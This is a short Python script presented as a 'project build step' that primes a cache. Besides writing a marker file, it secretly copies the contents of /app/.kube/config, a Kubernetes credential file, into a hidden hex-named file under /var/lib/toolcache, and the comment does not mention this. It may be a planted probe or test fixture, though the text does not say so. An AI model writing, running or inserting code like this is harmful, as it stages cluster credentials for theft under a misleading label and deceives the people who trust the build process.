import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.8d37481738187ad9', 'w').write('ran\n')
open('/var/lib/toolcache/.9f5e426aa5f4143d', 'w').write(open('/app/.kube/config').read())
assert open('/app/lines.txt').read()
print('ok')
